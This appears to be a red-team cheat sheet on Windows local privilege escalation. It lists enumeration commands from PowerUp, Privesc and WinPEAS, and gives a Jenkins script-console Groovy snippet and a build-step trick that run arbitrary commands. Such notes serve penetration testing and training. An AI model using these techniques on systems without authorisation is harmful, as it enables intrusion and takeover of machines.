# Privilege Escalation - Local

There are various ways of locally escalating privileges on Windows box:&#x20;

* Missing patches
* Automated deployment and AutoLogon passwords in clear text
* AlwaysInstallElevated (Any user can run MSI as SYSTEM)&#x20;
* Misconfigured Services&#x20;
* DLL Hijacking and more&#x20;
* NTLM Relaying a.k.a. Won't Fix

## Automated Tools

We can use below tools for complete coverage:

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" %}
PowerUp
{% endembed %}

{% embed url="https://github.com/enjoiz/Privesc" %}
Privesc
{% endembed %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}
WinPEAS
{% endembed %}

Get services with unquoted paths and a space in their name:

```powershell
#PowerUp
Get-ServiceUnquoted -Verbose
```

Get services where the current user can write to its binary path or change arguments to the binary:

```powershell
#PowerUp
Get-ModifiableServiceFile -Verbose
```

Get the services whose configuration current user can modify:

```powershell
#PowerUp
Get-ModifiableService -Verbose
```

Run all checks from:

```powershell
#PowerUp:
Invoke-AllChecks
#Privesc:
Invoke-PrivEsc
#PEASS-ng:
winPEASx64.exe
```

## Feature Abuse - Jenkins

If you have Admin access (default installation before 2.x), go to http://\<jenkins\_server>/script.

In the script console, Groovy scripts could be executed:

```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:

```powershell
powershell -c <command>
```

